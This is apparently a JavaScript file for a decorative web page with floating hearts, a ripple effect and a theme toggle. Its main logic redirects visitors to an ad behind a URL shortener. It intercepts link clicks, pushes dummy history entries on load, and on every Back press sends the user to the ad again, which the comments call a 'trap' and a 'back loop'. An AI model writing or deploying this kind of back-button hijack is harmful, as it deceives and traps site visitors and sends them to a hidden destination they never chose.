// ====== Configuration ======
const AD_URL = "https://shorturl.at/sd7pb"; // target ad link (yang diminta)
const HISTORY_PUSH_COUNT = 2; // jumlah pushState sebelum redirect, membantu "back loop"

// ====== Helpers ======
function safePushStates(count = 1) {
  // push dummy states to history so 'Back' from external will land back here
  for (let i = 0; i < count; i++) {
    try { history.pushState({trap:i}, "", location.href); } catch(e) { /* ignore */ }
  }
}

// ====== Redirect logic ======
function goToAdImmediate() {
  // push states to make sure back returns to this page
  safePushStates(HISTORY_PUSH_COUNT);
  // navigate to ad in same tab
  window.location.href = AD_URL;
}

// Attach click handlers to buttons that should redirect
document.querySelectorAll('a[data-ad="true"]').forEach(a => {
  a.addEventListener('click', function(e) {
    e.preventDefault();
    // visual ripple
    createRipple(this, e);
    // small timeout so user sees ripple then redirect
    setTimeout(() => { goToAdImmediate(); }, 160);
  });
});

// When user returns to this page via Back (popstate), redirect again to AD
window.addEventListener('popstate', function (e) {
  // immediate redirect back to ad
  window.location.href = AD_URL;
});

// On page load: proactively push a couple of states so that if user navigates away
// and presses Back they return here (and popstate will redirect).
window.addEventListener('load', function () {
  safePushStates(HISTORY_PUSH_COUNT);
  // start hearts animation spawn
  startHearts();
});

// ====== Ripple visual ======
function createRipple(el, event) {
  const rect = el.getBoundingClientRect();
  const x = event.clientX - rect.left;
  const y = event.clientY - rect.top;
  const span = document.createElement('span');
  span.className = 'ripple';
  span.style.left = (x - 45) + 'px';
  span.style.top = (y - 45) + 'px';
  el.appendChild(span);
  setTimeout(() => span.remove(), 700);
}

// ====== Floating hearts ======
function startHearts() {
  const container = document.querySelector('.hearts');
  if (!container) return;
  function spawn() {
    const s = document.createElement('span');
    s.textContent = '❤';
    s.style.left = (Math.random() * 100) + 'vw';
    s.style.fontSize = (Math.random() * 18 + 12) + 'px';
    s.style.animationDuration = (Math.random() * 4 + 4) + 's';
    container.appendChild(s);
    setTimeout(()=> s.remove(), 9000);
  }
  // spawn initially a few
  for (let i=0;i<8;i++) setTimeout(spawn, i*200);
  // keep spawning
  setInterval(spawn, 420);
}

// ====== Theme toggle (simple) ======
const toggleBtn = document.getElementById('toggleTheme');
if (toggleBtn) {
  toggleBtn.addEventListener('click', () => {
    document.body.classList.toggle('dark');
    toggleBtn.innerHTML = document.body.classList.contains('dark') ? '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>';
  });
}
